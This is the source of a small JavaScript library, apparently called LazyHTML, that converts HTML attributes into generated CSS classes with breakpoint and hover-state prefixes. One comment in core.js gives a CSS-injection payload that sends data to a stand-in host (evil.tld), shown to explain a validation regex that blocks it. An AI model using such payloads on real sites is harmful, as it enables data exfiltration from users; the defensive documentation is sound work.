/*!
 * LazyHTML — core.js
 * Author: RoomOff (Jade Hamel)
 * The atomic-style engine. Turns "prop:value" declarations into a single
 * shared class, injected once into a live <style> sheet. Everything else
 * (attributes.js, responsive.js, states.js, colors.js, observer.js) is
 * built on top of the three methods exposed here: injectRule, resolve, scan.
 */
(function (global) {
  "use strict";

  // Anything that could let an attribute VALUE break out of the single CSS
  // declaration it's placed into: ';' (new declaration/rule), '{' '}' (new
  // rule block), '<' '>' (defensive), comment delimiters. This closes the
  // realistic threat model for this library: the entire API surface is
  // "take arbitrary HTML attribute strings and splice them into a live
  // stylesheet", so any page rendering user-generated HTML (CMS comments,
  // markdown, forum posts) is one crafted attribute away from CSS
  // injection/exfiltration unless values are validated before use.
  //   <div bg="red;} img[src]{background:url(//evil.tld/leak?)}">
  var UNSAFE_VALUE = /[;{}<>]|\/\*|\*\//;

  function isSafeDeclarationValue(v) {
    return typeof v === "string" && !UNSAFE_VALUE.test(v);
  }

  var LazyHTML = {
    version: "1.0.1",
    config: {
      prefix: "lz-",       // prefix used for raw/passthrough CSS attributes: lz-text-shadow="..."
      autoInit: true,      // auto-scan on DOMContentLoaded
      lazyAttr: "lazy",    // <div lazy="true" ...> defers style resolution until it enters the viewport
      root: null,          // set once mounted, the <style> element's sheet
      strict: true         // reject declaration values that could break out of
                            // their CSS declaration (see UNSAFE_VALUE above).
                            // Only turn this off if every attribute on the
                            // page is fully author-controlled and never
                            // derived from user-generated content.
    },
    attributeMap: {},      // filled in by lazy-html.attributes.js
    breakpoints: {},       // filled in by lazy-html.responsive.js
    states: {},            // filled in by lazy-html.states.js

    _cache: new Map(),
    _sheetEl: null,
    _mutationObserver: null,
    _intersectionObserver: null,

    /* ---------------- stylesheet plumbing ---------------- */

    _ensureSheet: function () {
      if (!this._sheetEl) {
        var el = document.createElement("style");
        el.id = "lazy-html-runtime";
        el.setAttribute("data-lazy-html", this.version);
        document.head.appendChild(el);
        this._sheetEl = el;
      }
      return this._sheetEl.sheet;
    },

    _hash: function (str) {
      var h = 0;
      for (var i = 0; i < str.length; i++) {
        h = (h * 31 + str.charCodeAt(i)) | 0;
      }
      return this.config.prefix.replace(/-$/, "") + "-" + Math.abs(h).toString(36);
    },

    /**
     * Turns a list of "prop:value" declarations into a single class name.
     * Identical declaration sets (same body + same media query + same
     * pseudo-selector) are cached and reused — this is the "combine the
     * maximum number of attributes into one element" part: no matter how
     * many attributes an element carries, LazyHTML always resolves it down
     * to one shared class per unique visual signature.
     */
    injectRule: function (declarations, opts) {
      opts = opts || {};
      var pseudo = opts.pseudo || "";
      var media = opts.media || "";
      if (!declarations.length) return null;

      if (this.config.strict) {
        for (var d = 0; d < declarations.length; d++) {
          if (!isSafeDeclarationValue(declarations[d])) {
            if (global.console) {
              console.warn(
                "[LazyHTML] blocked a declaration that could break out of " +
                "its CSS rule (contains ; { } < > or a comment delimiter):",
                declarations[d]
              );
            }
            return null;
          }
        }
      }

      var body = declarations.join(";");
      var key = media + "|" + pseudo + "|" + body;

      if (this._cache.has(key)) return this._cache.get(key);

      var cls = this._hash(key);
      // Collision guard: two different declaration sets should never
      // resolve to the same class. If the hash collides, disambiguate
      // deterministically instead of silently corrupting an unrelated
      // element's styles.
      while (this._classBodies && this._classBodies.has(cls) && this._classBodies.get(cls) !== body) {
        cls = cls + "x";
      }
      (this._classBodies || (this._classBodies = new Map())).set(cls, body);

      var rule = "." + cls + pseudo + "{" + body + "}";
      if (media) rule = "@media " + media + "{" + rule + "}";

      try {
        var sheet = this._ensureSheet();
        sheet.insertRule(rule, sheet.cssRules.length);
      } catch (e) {
        if (global.console) console.warn("[LazyHTML] could not insert rule:", rule, e);
        return null;
      }

      this._cache.set(key, cls);
      return cls;
    },

    /* ---------------- element resolution ---------------- */

    /**
     * Resolves every recognised lazy attribute on `el` into classes and
     * applies them. Safe to call repeatedly (e.g. after attribute mutation).
     */
    resolve: function (el) {
      if (!el || el.nodeType !== 1) return;
      var names = el.getAttributeNames ? el.getAttributeNames() : [];
      var classesToAdd = [];

      for (var i = 0; i < names.length; i++) {
        var name = names[i];
        var value = el.getAttribute(name);
        var result = this._resolveAttribute(name, value, el);
        if (result) classesToAdd.push(result);
      }

      if (classesToAdd.length) {
        el.classList.add.apply(el.classList, classesToAdd);
        el.setAttribute("data-lazy-resolved", "true");
      }
    },

    _resolveAttribute: function (rawName, value, el) {
      if (value === "" || value == null) value = "true"; // boolean-style attrs
      var name = rawName.toLowerCase();

      // passthrough raw CSS: lz-<property>="<value>"
      if (name.indexOf(this.config.prefix) === 0) {
        var prop = name.slice(this.config.prefix.length);
        // property name comes from the ATTRIBUTE NAME, which HTML parsing
        // already restricts to valid attribute-name characters, but we
        // still confirm it looks like a CSS property/custom-property
        // token before splicing it in, since this is the one place a
        // property name (not just a value) is attacker-influenceable.
        if (!prop || !/^(--)?[a-z-]+$/i.test(prop)) return null;
        return this.injectRule([prop + ":" + value]);
      }

      var tokens = name.split(":");
      var propToken = tokens.pop();
      var fn = this.attributeMap[propToken];
      if (!fn) return null;

      var decls = fn(value, el);
      if (!decls || !decls.length) return null;

      // walk remaining tokens: breakpoints and states, order-independent
      var media = "";
      var pseudo = "";
      for (var j = 0; j < tokens.length; j++) {
        var t = tokens[j];
        if (this.breakpoints[t]) {
          media = this.breakpoints[t];
        } else if (this.states[t]) {
          pseudo += this.states[t];
        }
      }

      return this.injectRule(decls, { media: media, pseudo: pseudo });
    },

    /* ---------------- registration API ---------------- */

    registerAttribute: function (name, fn) {
      this.attributeMap[name] = fn;
      return this;
    },

    registerBreakpoint: function (name, mediaQuery) {
      this.breakpoints[name] = mediaQuery;
      return this;
    },

    registerState: function (name, pseudoSelector) {
      this.states[name] = pseudoSelector;
      return this;
    },

    /* ---------------- lifecycle ---------------- */

    /**
     * Tears down everything LazyHTML mounted: disconnects the
     * MutationObserver and IntersectionObserver set up by observer.js,
     * and removes the injected <style> element. Classes already applied
     * to elements are left in place (removing them would be destructive
     * and is rarely what a caller wants); call resolve() again after
     * re-init if you need a full re-scan. Required for SPA routing /
     * hot-reload scenarios where LazyHTML is torn down and remounted.
     */
    destroy: function () {
      if (this._mutationObserver) {
        this._mutationObserver.disconnect();
        this._mutationObserver = null;
      }
      if (this._intersectionObserver) {
        this._intersectionObserver.disconnect();
        this._intersectionObserver = null;
      }
      if (this._sheetEl && this._sheetEl.parentNode) {
        this._sheetEl.parentNode.removeChild(this._sheetEl);
      }
      this._sheetEl = null;
      this._cache = new Map();
      this._classBodies = new Map();
    }
  };

  global.LazyHTML = LazyHTML;
})(typeof window !== "undefined" ? window : this);
/*!
 * LazyHTML — colors.js
 * Resolves color values written the "lazy" way: bare hex without '#',
 * hex with a stray '#' typo like "#black", named CSS colors, css vars,
 * or already-valid rgb()/rgba()/hsl() strings. Never throws — worst case
 * it falls back to the raw string so the browser's own error handling
 * (silently ignoring an invalid declaration) takes over.
 */
(function (global) {
  "use strict";

  var NAMED = ("black white red green blue yellow orange purple pink gray grey " +
    "brown cyan magenta lime teal navy maroon olive silver gold indigo violet " +
    "coral salmon khaki crimson transparent currentColor").split(" ");

  var NAMED_SET = {};
  NAMED.forEach(function (n) { NAMED_SET[n.toLowerCase()] = n; });

  function isHex(str) {
    return /^[0-9a-f]{3}$|^[0-9a-f]{6}$|^[0-9a-f]{8}$/i.test(str);
  }

  function resolveColor(raw) {
    if (!raw) return null;
    var v = String(raw).trim();

    // css var: color="--signal" -> var(--signal)
    if (v.indexOf("--") === 0) return "var(" + v + ")";
    if (v.indexOf("var(") === 0) return v;

    // already a function form
    if (/^(rgb|hsl)a?\(/i.test(v)) return v;

    // strip any stray leading '#' characters (tolerates "#black", "##fff")
    var stripped = v.replace(/^#+/, "");

    if (isHex(stripped)) return "#" + stripped;

    var lower = stripped.toLowerCase();
    if (NAMED_SET[lower]) return NAMED_SET[lower];

    // unknown token: hand it to the browser as-is (covers extended/CSS4
    // color keywords LazyHTML doesn't enumerate, e.g. "rebeccapurple")
    return stripped;
  }

  global.LazyHTML = global.LazyHTML || {};
  global.LazyHTML.resolveColor = resolveColor;
})(typeof window !== "undefined" ? window : this);
/*!
 * LazyHTML — attributes.js
 * Maps every element attribute LazyHTML understands to one or more CSS
 * declarations. This is the actual "language": what you can write on a
 * tag, and what it becomes. Each entry is fn(value, el) -> ["prop:val", ...]
 */
(function (global) {
  "use strict";

  var LH = global.LazyHTML;
  var color = LH.resolveColor;

  function unit(v) {
    if (v == null) return v;
    v = String(v).trim();
    if (v === "0" || v === "") return v || "0";
    if (/^-?\d+(\.\d+)?$/.test(v)) return v + "px"; // bare number -> px
    return v; // already has a unit, is a %, var(), calc(), etc.
  }

  function bool(v) {
    return v === "true" || v === "" || v === true || v === "1";
  }

  var map = {
    /* ---- typography ---- */
    color:      function (v) { return ["color:" + color(v)]; },
    bg:         function (v) { return ["background-color:" + color(v)]; },
    "bg-image": function (v) { return ["background-image:url(" + v + ")"]; },
    "bg-size":  function (v) { return ["background-size:" + v]; },
    "bg-pos":   function (v) { return ["background-position:" + v]; },
    size:       function (v) { return ["font-size:" + unit(v)]; },
    weight:     function (v) { return ["font-weight:" + v]; },
    font:       function (v) { return ["font-family:" + v]; },
    lh:         function (v) { return ["line-height:" + v]; },
    ls:         function (v) { return ["letter-spacing:" + unit(v)]; },
    align:      function (v) { return ["text-align:" + v]; },
    bold:       function (v) { return bool(v) ? ["font-weight:700"] : []; },
    italic:     function (v) { return bool(v) ? ["font-style:italic"] : []; },
    underline:  function (v) { return bool(v) ? ["text-decoration:underline"] : []; },
    strike:     function (v) { return bool(v) ? ["text-decoration:line-through"] : []; },
    uppercase:  function (v) { return bool(v) ? ["text-transform:uppercase"] : []; },
    lowercase:  function (v) { return bool(v) ? ["text-transform:lowercase"] : []; },
    capitalize: function (v) { return bool(v) ? ["text-transform:capitalize"] : []; },
    nowrap:     function (v) { return bool(v) ? ["white-space:nowrap"] : []; },
    truncate:   function (v) { return bool(v) ? [
      "overflow:hidden", "text-overflow:ellipsis", "white-space:nowrap"
    ] : []; },

    /* ---- box model ---- */
    w:      function (v) { return ["width:" + unit(v)]; },
    h:      function (v) { return ["height:" + unit(v)]; },
    minw:   function (v) { return ["min-width:" + unit(v)]; },
    minh:   function (v) { return ["min-height:" + unit(v)]; },
    maxw:   function (v) { return ["max-width:" + unit(v)]; },
    maxh:   function (v) { return ["max-height:" + unit(v)]; },

    pad:    function (v) { return ["padding:" + unit(v)]; },
    "pad-x":function (v) { return ["padding-left:" + unit(v), "padding-right:" + unit(v)]; },
    "pad-y":function (v) { return ["padding-top:" + unit(v), "padding-bottom:" + unit(v)]; },
    pt:     function (v) { return ["padding-top:" + unit(v)]; },
    pr:     function (v) { return ["padding-right:" + unit(v)]; },
    pb:     function (v) { return ["padding-bottom:" + unit(v)]; },
    pl:     function (v) { return ["padding-left:" + unit(v)]; },

    m:      function (v) { return ["margin:" + unit(v)]; },
    mx:     function (v) { return ["margin-left:" + unit(v), "margin-right:" + unit(v)]; },
    my:     function (v) { return ["margin-top:" + unit(v), "margin-bottom:" + unit(v)]; },
    mt:     function (v) { return ["margin-top:" + unit(v)]; },
    mr:     function (v) { return ["margin-right:" + unit(v)]; },
    mb:     function (v) { return ["margin-bottom:" + unit(v)]; },
    ml:     function (v) { return ["margin-left:" + unit(v)]; },

    gap:      function (v) { return ["gap:" + unit(v)]; },
    "row-gap":function (v) { return ["row-gap:" + unit(v)]; },
    "col-gap":function (v) { return ["column-gap:" + unit(v)]; },

    /* ---- border / shape / effects ---- */
    border:        function (v) { return ["border:" + v]; },
    "border-color":function (v) { return ["border-color:" + color(v)]; },
    "border-width":function (v) { return ["border-width:" + unit(v)]; },
    radius:        function (v) { return ["border-radius:" + unit(v)]; },
    shadow:        function (v) { return ["box-shadow:" + v]; },
    opacity:       function (v) { return ["opacity:" + v]; },
    cursor:        function (v) { return ["cursor:" + v]; },
    blur:          function (v) { return ["filter:blur(" + unit(v) + ")"]; },
    rotate:        function (v) { return ["transform:rotate(" + v + ")"]; },
    scale:         function (v) { return ["transform:scale(" + v + ")"]; },
    translate:     function (v) { return ["transform:translate(" + v + ")"]; },
    transition:    function (v) { return ["transition:" + v]; },
    duration:      function (v) { return ["transition-duration:" + v]; },
    ease:          function (v) { return ["transition-timing-function:" + v]; },
    animate:       function (v) { return ["animation:" + v]; },

    /* ---- layout ---- */
    display: function (v) { return ["display:" + v]; },
    flex:    function (v) { return v === "true" || v === "" ? ["display:flex"] : ["flex:" + v]; },
    grid:    function (v) { return ["display:grid", "grid-template-columns:" + v]; },
    cols:    function (v) { return ["grid-template-columns:repeat(" + v + ",1fr)"]; },
    rows:    function (v) { return ["grid-template-rows:repeat(" + v + ",1fr)"]; },
    direction: function (v) { return ["flex-direction:" + v]; },
    wrap:    function (v) { return ["flex-wrap:" + v]; },
    justify: function (v) { return ["justify-content:" + v]; },
    items:   function (v) { return ["align-items:" + v]; },
    self:    function (v) { return ["align-self:" + v]; },
    center:  function (v) { return bool(v) ? [
      "display:flex", "align-items:center", "justify-content:center"
    ] : []; },

    /* ---- position ---- */
    pos:    function (v) { return ["position:" + v]; },
    top:    function (v) { return ["top:" + unit(v)]; },
    right:  function (v) { return ["right:" + unit(v)]; },
    bottom: function (v) { return ["bottom:" + unit(v)]; },
    left:   function (v) { return ["left:" + unit(v)]; },
    z:      function (v) { return ["z-index:" + v]; },

    /* ---- visibility ---- */
    hide:    function (v) { return bool(v) ? ["display:none"] : []; },
    visible: function (v) { return bool(v) ? ["visibility:visible"] : ["visibility:hidden"]; }
  };

  Object.keys(map).forEach(function (key) {
    LH.registerAttribute(key, map[key]);
  });
})(typeof window !== "undefined" ? window : this);
/*!
 * LazyHTML — responsive.js
 * Registers breakpoint prefixes usable on any attribute:
 *   <div md:cols="2" lg:cols="4" cols="1">
 * Mobile-first: the base (unprefixed) attribute applies everywhere,
 * breakpointed attributes override it from that width upward.
 */
(function (global) {
  "use strict";
  var LH = global.LazyHTML;

  LH.registerBreakpoint("sm", "(min-width:480px)");
  LH.registerBreakpoint("md", "(min-width:768px)");
  LH.registerBreakpoint("lg", "(min-width:1024px)");
  LH.registerBreakpoint("xl", "(min-width:1280px)");
})(typeof window !== "undefined" ? window : this);
/*!
 * LazyHTML — states.js
 * Registers interaction-state prefixes usable on any attribute:
 *   <button bg="#222" hover:bg="#34d399" hover:scale="1.03">
 * Combine freely with breakpoints and each other, order doesn't matter:
 *   <a md:hover:underline="true">
 */
(function (global) {
  "use strict";
  var LH = global.LazyHTML;

  LH.registerState("hover", ":hover");
  LH.registerState("focus", ":focus");
  LH.registerState("focuswithin", ":focus-within");
  LH.registerState("active", ":active");
  LH.registerState("disabled", ":disabled");
  LH.registerState("first", ":first-child");
  LH.registerState("last", ":last-child");
  LH.registerState("before", "::before");
  LH.registerState("after", "::after");
})(typeof window !== "undefined" ? window : this);
/*!
 * LazyHTML — observer.js
 * The "lazy" in LazyHTML: elements marked lazy="true" are not resolved
 * into CSS until they scroll into view. Everything else is resolved
 * immediately on scan. A MutationObserver keeps watching so content
 * injected later (SPA routing, fetch()'d HTML, etc.) is picked up too.
 */
(function (global) {
  "use strict";
  var LH = global.LazyHTML;
  var document = global.document;

  var io = null;
  function getIO() {
    if (io) return io;
    if (!("IntersectionObserver" in global)) return null;
    io = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (entry.isIntersecting) {
          LH.resolve(entry.target);
          io.unobserve(entry.target);
        }
      });
    }, { rootMargin: "150px" });
    LH._intersectionObserver = io;
    return io;
  }

  function isLazy(el) {
    var v = el.getAttribute(LH.config.lazyAttr);
    return v === "true" || v === "";
  }

  function processElement(el) {
    if (el.hasAttribute("data-lazy-resolved")) return;
    if (isLazy(el)) {
      var observer = getIO();
      if (observer) { observer.observe(el); return; }
    }
    LH.resolve(el);
  }

  /**
   * Scan a root node (default: whole document) for elements carrying
   * lazy attributes and resolve them. Safe to call repeatedly.
   */
  LH.scan = function (root) {
    root = root || document;
    if (root.nodeType === 1) processElement(root);
    var all = root.querySelectorAll ? root.querySelectorAll("*") : [];
    for (var i = 0; i < all.length; i++) processElement(all[i]);
  };

  LH.observeMutations = function (root) {
    root = root || document.documentElement;
    var mo = new MutationObserver(function (mutations) {
      mutations.forEach(function (m) {
        if (m.type === "childList") {
          m.addedNodes.forEach(function (node) {
            if (node.nodeType === 1) LH.scan(node);
          });
        } else if (m.type === "attributes" && m.target.nodeType === 1) {
          m.target.removeAttribute("data-lazy-resolved");
          processElement(m.target);
        }
      });
    });
    mo.observe(root, { childList: true, subtree: true, attributes: true });
    LH._mutationObserver = mo;
    return mo;
  };
})(typeof window !== "undefined" ? window : this, void 0);
/*!
 * LazyHTML — init.js
 * Auto-boots the engine on DOMContentLoaded unless LazyHTML.config.autoInit
 * is set to false before this file runs. Call LazyHTML.scan() manually at
 * any time to re-scan (e.g. after injecting HTML via innerHTML/fetch).
 */
(function (global) {
  "use strict";
  var LH = global.LazyHTML;
  var document = global.document;

  function boot() {
    LH.scan(document);
    LH.observeMutations(document.documentElement);
    document.dispatchEvent(new CustomEvent("lazyhtml:ready", { detail: LH }));
  }

  if (LH.config.autoInit) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", boot);
    } else {
      boot();
    }
  }
})(typeof window !== "undefined" ? window : this);
